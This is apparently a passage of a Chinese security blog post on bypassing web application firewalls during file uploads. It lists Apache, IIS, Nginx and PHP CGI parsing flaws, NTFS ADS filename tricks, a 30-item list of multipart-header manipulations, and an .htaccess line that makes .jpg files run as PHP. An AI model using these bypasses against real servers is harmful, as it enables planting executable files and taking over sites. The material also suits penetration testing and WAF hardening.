+<p>waf也有自己的黑名单白名单 白名单自然是合法的类似html这样的文件了</p>
+<p>黑名单一般如下 在上传fuzz的时候 可以fuzz 说不定就有漏网之鱼</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">asp|asa|cer|cdx|aspx|ashx|ascx|asax</span><br><span class="line">php|php2|php3|php4|php5|asis|htaccess</span><br><span class="line">htm|html|shtml|pwml|phtml|phtm|js|jsp</span><br><span class="line">vbs|asis|sh|reg|cgi|exe|dll|com|bat|pl|cfc|cfm|ini</span><br></pre></td></tr></table></figure>
+
+<h3 id="web容器特性-1"><a href="#web容器特性-1" class="headerlink" title="web容器特性"></a>web容器特性</h3><p><strong>Apache 解析漏洞</strong></p>
+<p>在版本1.x和2.x的版本基础上，apache解析文件名时，是从右向左开始解析，直到遇见apache能够解析的扩展名，例如test.php.oooo.ssss 可能会绕过waf 然后apache解析的时候解析成了test.php</p>
+<p><strong>IIS6.0 解析漏洞</strong></p>
+<p>1.如果文件名中<code>.asp</code>,<code>.asa</code>,<code>.cer</code> 那么都会优先使用asp来进行解析</p>
+<p>2.如果目录名包含 <code>.asp</code>,<code>.asa</code>,<code>.cer</code> 那么该目录下的所有文件都按照asp来解析</p>
+<p><strong>Nginx 解析漏洞</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Nginx 0.5.*</span><br><span class="line">Nginx 0.6.*</span><br><span class="line">Nginx 0.7 &lt;&#x3D; 0.7.65</span><br><span class="line">Nginx 0.8 &lt;&#x3D; 0.8.37</span><br></pre></td></tr></table></figure>
+
+<p>以上版本:上传一个在waf白名单之内扩展名的文件test.jpg，然后以test.jpg.php进行请求</p>
+<p>Nginx 0.8.41 – 1.5.6：</p>
+<p>上传一个在waf白名单之内扩展名的文件test.jpg，然后以test.jpg%20.php进行请求</p>
+<p><strong>PHP CGI解析漏洞</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">IIS 7.0&#x2F;7.5</span><br><span class="line">Nginx &lt; 0.8.3</span><br></pre></td></tr></table></figure>
+
+<p>以上的版本中默认的php配置文件<code>cgi.fix_pathinfo=1</code>时，上传一个存在于白名单的扩展名文件test.jpg，在请求时以<code>test.jpg/test.php</code>请求，会以php来解析</p>
+<h3 id="系统特性"><a href="#系统特性" class="headerlink" title="系统特性"></a>系统特性</h3><p><strong>Windows 特殊字符</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当我们上传的filename内容是test.php&#123;%80~%99&#125;，waf不能识别导致绕过</span><br></pre></td></tr></table></figure>
+
+<p><strong>NTFS ADS特性：</strong></p>
+<p>ADS是NTFS磁盘格式的一个特性，用于NTFS交换数据流。在上传文件时，如果waf对请求正文的<code>filename</code>匹配不当的话可能会导致绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php在windows的时候如果文件名+&quot;::$DATA&quot;会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持&quot;::$DATA&quot;之前的文件名</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">test.php:t.jpg--&gt;服务器生成test.php 文件内容为空</span><br><span class="line">test.php::$DATA--&gt;服务器生成test.php 文件内容为&lt;?php phpinfo();?&gt;</span><br><span class="line">test.php::$INDEX_ALLOCATION--&gt;服务器生成test.php文件夹</span><br><span class="line">test.php::$DATA.jpg--&gt;服务器生成0.jpg 内容为 &lt;?php phpinfo();?&gt;</span><br><span class="line">test.php::$DATA\ooo.jpg--&gt;服务器生成ooo.jpg 内容为&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里放一下congrong大牛的30个姿势</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">1. filename在content-type下面</span><br><span class="line">2. .asp&#123;80-90&#125;</span><br><span class="line">3. NTFS ADS</span><br><span class="line">4. .asp...</span><br><span class="line">5. boundary不一致</span><br><span class="line">6. iis6分号截断asp.asp;asp.jpg</span><br><span class="line">7. apache解析漏洞php.php.ddd</span><br><span class="line">8. boundary和content-disposition中间插入换行</span><br><span class="line">9. hello.php:a.jpg然后hello.&lt;&lt;&lt;</span><br><span class="line">10. filename&#x3D;php.php</span><br><span class="line">11. filename&#x3D;&quot;a.txt&quot;;filename&#x3D;&quot;a.php&quot;</span><br><span class="line">12. name&#x3D;\n&quot;file&quot;;filename&#x3D;&quot;a.php&quot;</span><br><span class="line">13. content-disposition:\n</span><br><span class="line">14. .htaccess文件</span><br><span class="line">15. a.jpg.\nphp</span><br><span class="line">16. 去掉content-disposition的form-data字段</span><br><span class="line">17. php&lt;5.3 单双引号截断特性</span><br><span class="line">18. 删掉content-disposition: form-data;</span><br><span class="line">19. content-disposition\00:</span><br><span class="line">20. &#123;char&#125;+content-disposition</span><br><span class="line">21. head头的content-type: tab</span><br><span class="line">22. head头的content-type: multipart&#x2F;form-DATA</span><br><span class="line">23. filename后缀改为大写</span><br><span class="line">24. head头的Content-Type: multipart&#x2F;form-data;\n</span><br><span class="line">25. .asp空格</span><br><span class="line">26. .asp0x00.jpg截断</span><br><span class="line">27. 双boundary</span><br><span class="line">28. file\nname&#x3D;&quot;php.php&quot;</span><br><span class="line">29. head头content-type空格:</span><br><span class="line">30. form-data字段与name字段交换位置</span><br></pre></td></tr></table></figure>
+
+<h3 id="其他姿势"><a href="#其他姿势" class="headerlink" title="其他姿势"></a>其他姿势</h3><p>1.对文件内容 数据包格式 数据包各项header进行处理</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;test.php&quot;</span><br><span class="line">将form-data;            修改为~form-data</span><br></pre></td></tr></table></figure>
+
+<p>2.替换大小写来进行绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;test.php&quot;</span><br><span class="line">Content-Type: application&#x2F;octet-stream</span><br><span class="line">将Content-Disposition    修改为content-Disposition</span><br><span class="line">将 form-data            修改为Form-data</span><br><span class="line">将 Content-Type         修改为content-Type</span><br></pre></td></tr></table></figure>
+
+<p>3.通过增删空格来绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;test.php&quot;</span><br><span class="line">Content-Type: application&#x2F;octet-stream</span><br><span class="line">将Content-Disposition: form-data          冒号后面 增加或减少一个空格</span><br><span class="line">将form-data; name&#x3D;&quot;file&quot;;                分号后面 增加或减少一个空格</span><br><span class="line">将 Content-Type: application&#x2F;octet-stream   冒号后面 增加一个空格</span><br><span class="line"></span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;---------------------------471463142114</span><br><span class="line">修改后:</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary &#x3D;---------------------------471463142114</span><br><span class="line">boundary后面加入空格</span><br></pre></td></tr></table></figure>
+
+<p>4.字符串拼接绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">看Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;test.php&quot;</span><br><span class="line">将 form-data 修改为   f+orm-data</span><br><span class="line">将 from-data 修改为   form-d+ata</span><br></pre></td></tr></table></figure>
+
+<p>5.双文件上传绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action&#x3D;&quot;https:&#x2F;&#x2F;www.xxx.com&#x2F;xxx.asp(php)&quot; method&#x3D;&quot;post&quot;</span><br><span class="line">name&#x3D;&quot;form1&quot; enctype&#x3D;&quot;multipart&#x2F;form‐data&quot;&gt;</span><br><span class="line">&lt;input name&#x3D;&quot;FileName1&quot; type&#x3D;&quot;FILE&quot; class&#x3D;&quot;tx1&quot; size&#x3D;&quot;40&quot;&gt;</span><br><span class="line">&lt;input name&#x3D;&quot;FileName2&quot; type&#x3D;&quot;FILE&quot; class&#x3D;&quot;tx1&quot; size&#x3D;&quot;40&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;Submit&quot; value&#x3D;&quot;上传&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure>
+
+<ol start="6">
+<li>HTTP header 属性值绕过</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;test.php&quot;</span><br><span class="line">我们通过替换form-data 为*来绕过</span><br><span class="line">Content-Disposition: *; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;test.php&quot;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;image&quot;; filename&#x3D;&quot;test.png&quot;Content-Type: image&#x2F;png</span><br><span class="line">绕过内容如下：</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;image&quot;; filename&#x3D;&quot;test.png</span><br><span class="line">C.php&quot;</span><br><span class="line">删除掉ontent-Type: image&#x2F;jpeg只留下c，将.php加c后面即可，这里要注意，双引号要跟着c.php&quot;.</span><br></pre></td></tr></table></figure>
+
+<p>7.编码绕过</p>
+<p>base64，urlencode，unicode等等</p>
+<p>8.上传一个.htaccess文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">上传的jpg文件都会以php格式解析</span><br><span class="line">添加.htaccess内容：</span><br><span class="line">AddType    application&#x2F;x-httpd-php    .jpg</span><br></pre></td></tr></table></figure>
+
+<p>By oslo</p>
+
+    </div>
+
+    
+    
+    
+        
+
+  <div class="followme">
+    <p>欢迎关注我的其它发布渠道</p>
+
+    <div class="social-list">
+
+            <div class="social-item">
+              <a target="_blank" class="social-link" href="/atom.xml">
+                <span class="icon">
+                  <i class="fa fa-rss"></i>
+                </span>
+
+                <span class="label">RSS</span>
+              </a>
+            </div>
+    </div>
+  </div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/Bypass/" rel="tag"><i class="fa fa-tag"></i> Bypass</a>
+              <a href="/tags/Recording/" rel="tag"><i class="fa fa-tag"></i> Recording</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/03/30/Some-Tips/" rel="prev" title="Some Tips">
+      <i class="fa fa-chevron-left"></i> Some Tips
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Waf-amp-amp-Bypass"><span class="nav-number">1.</span> <span class="nav-text">Waf &amp;&amp; Bypass</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Waf-Web-Application-Firewall"><span class="nav-number">1.1.</span> <span class="nav-text">Waf(Web Application Firewall)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Bypass"><span class="nav-number">1.2.</span> <span class="nav-text">Bypass</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#web容器特性"><span class="nav-number">1.2.1.</span> <span class="nav-text">web容器特性</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web应用层的问题"><span class="nav-number">1.2.2.</span> <span class="nav-text">Web应用层的问题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#WAF自身的问题"><span class="nav-number">1.2.3.</span> <span class="nav-text">WAF自身的问题</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#数据处理不恰当"><span class="nav-number">1.2.3.1.</span> <span class="nav-text">数据处理不恰当</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Bypass-for-Sqli"><span class="nav-number">1.3.</span> <span class="nav-text">Bypass for Sqli</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Bypass-for-Upload"><span class="nav-number">1.4.</span> <span class="nav-text">Bypass for Upload</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#web容器特性-1"><span class="nav-number">1.4.1.</span> <span class="nav-text">web容器特性</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#系统特性"><span class="nav-number">1.4.2.</span> <span class="nav-text">系统特性</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#其他姿势"><span class="nav-number">1.4.3.</span> <span class="nav-text">其他姿势</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Oslo"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Oslo</p>
+  <div class="site-description" itemprop="description">You guilty , You died</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">7</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+      <a href="/">
+         <img class="site-author-image" itemprop="image"
+       	src="/images/avatar.jpg"
+       	alt="Oslo" />
+      </a>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Oslo</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">92k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">1:24</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/pjax/pjax.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/lozad@1/dist/lozad.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.getAttribute('pjax') !== null) {
+      script.setAttribute('pjax', '');
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="pjax">
+  
+
+  
+
+  
+
+    </div>
+</body>
+</html>
